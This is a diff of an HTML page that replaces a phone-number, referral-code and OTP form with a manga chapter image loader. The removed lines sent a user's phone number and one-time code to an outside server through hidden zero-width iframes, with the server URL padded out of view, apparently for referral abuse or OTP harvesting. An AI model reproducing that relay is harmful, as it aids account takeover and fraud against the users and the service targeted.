@@ -3,122 +3,73 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Phone Number and Referral Code Form</title>
+<title>Load Images Vertically</title>
 <style>
-    body {
-        font-family: Arial, sans-serif;
-        background-color: #f4f4f4;
-        margin: 0;
-        padding: 0;
-    }
-
-    #myForm {
-        max-width: 400px;
-        margin: 20px auto;
-        padding: 20px;
-        background-color: #fff;
-        border-radius: 8px;
-        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-    }
-
-    label {
-        font-weight: bold;
-        margin-bottom: 5px;
-        display: block;
-    }
-
-    input[type="tel"],
-    input[type="text"],
-    input[type="number"] {
-        width: calc(100% - 22px);
-        padding: 10px;
-        margin-bottom: 10px;
-        border: 1px solid #ccc;
-        border-radius: 5px;
-        box-sizing: border-box;
-    }
-
-    button {
-        background-color: #007bff;
-        color: #fff;
-        border: none;
-        padding: 10px 20px;
-        border-radius: 5px;
-        cursor: pointer;
-        font-size: 16px;
-    }
-
-    button:hover {
-        background-color: #0056b3;
-    }
-
-    #resultFrame, #resultFramet {
-        width: 0%;
-        min-height: 0px;
-        border: 1px solid #ccc;
-        box-sizing: border-box;
-        margin-top: 20px;
-        resize: both;
-        overflow: auto;
-    }
+  #image-container {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+  }
+  img {
+    max-width: 100%;
+    height: auto;
+    margin: 5px 0;
+  }
 </style>
 </head>
 <body>
+  <div id="image-container">
+    <h2>Enter a Chapter (e.g., 4-1):</h2>
+    <input type="text" id="numberInput" placeholder="Enter a chapter">
+    <button onclick="loadImages()">Load Images</button>
+  </div>
 
-<form id="myForm">
-    <label for="phoneNumber">Phone Number:</label>
-    <input type="tel" id="phoneNumber" name="phoneNumber" required>
-    <label for="referralCode">Referral Code:</label>
-    <input type="text" id="referralCode" name="referralCode">
-    <button type="button" onclick="openInFrame()">GET OTP</button>
+  <script>
+    function loadImages() {
+      var userInput = document.getElementById('numberInput').value.trim();
+      if (!userInput) {
+        alert('Please enter a chapter');
+        return;
+      }
 
-    <label for="otp">Enter OTP:</label>
-    <input type="number" id="otp" name="otp">
-    <button type="button" onclick="openInFramet()">SUBMIT</button>
-</form>
+      var imageContainer = document.getElementById('image-container');
+      imageContainer.innerHTML = '<h2>Loading Images...</h2>';
 
-<iframe id="resultFrame" scrolling="no"></iframe>
-<iframe id="resultFramet" scrolling="no"></iframe>
+      var baseUrl = 'https://img2.mangagojo.com/the-unfavourable-job-appraiser-is-actually-the-strongest/chapter-' + userInput + '/';
+      var imageHtml = '';
 
-<script>
-    var link = "
-  
-  
-  
-  
-  https://arshzz1.serv00.net/usgillam/
-  
-  
-  
-  
-  ";
-  
-  
-  
-  
-    function openInFrame() {
-        var phoneNumber = document.getElementById("phoneNumber").value;
-        var referralCode = document.getElementById("referralCode").value;
+      for (var i = 1; i <= 20; i++) {
+        var imageUrl = baseUrl + (i < 10 ? '00' : '0') + i + '.jpg';
+        imageHtml += '<img src="' + imageUrl + '" alt="Image ' + i + '">';
+      }
 
-        // Construct the URL with dynamic values
-        var url = link + "?mobile=" + encodeURIComponent(phoneNumber) + "&refer=" + encodeURIComponent(referralCode) + "&submit=";
+      // Create a temporary container to load images and check if they are loaded
+      var tempContainer = document.createElement('div');
+      tempContainer.innerHTML = imageHtml;
 
-        // Set the iframe src attribute to the constructed URL
-        document.getElementById("resultFrame").src = url;
+      // Check if images are loaded successfully
+      var images = tempContainer.querySelectorAll('img');
+      var loadedCount = 0;
+
+      images.forEach(function(img) {
+        img.onload = function() {
+          loadedCount++;
+          if (loadedCount === images.length) {
+            imageContainer.innerHTML = imageHtml;
+          }
+        };
+        img.onerror = function() {
+          loadedCount++;
+          console.error('Failed to load image: ' + img.src);
+          if (loadedCount === images.length) {
+            imageContainer.innerHTML = imageHtml;
+          }
+        };
+      });
+
+      // Append tempContainer to the document to trigger image loading
+      document.body.appendChild(tempContainer);
     }
-  
-    function openInFramet() {
-        var phoneNumber = document.getElementById("phoneNumber").value;
-        var referralCode = document.getElementById("referralCode").value;
-        var otp = document.getElementById("otp").value;
-
-        // Construct the URL with dynamic values
-        var url = linl + "otp.php?mobile=" + encodeURIComponent(phoneNumber) + "&refer=" + encodeURIComponent(referralCode) + "&otp=" + encodeURIComponent(otp) + "&hostt=www.usgillam.com&submit=";
-
-        // Set the iframe src attribute to the constructed URL
-        document.getElementById("resultFramet").src = url;
-    }
-</script>
-
+  </script>
 </body>
 </html>
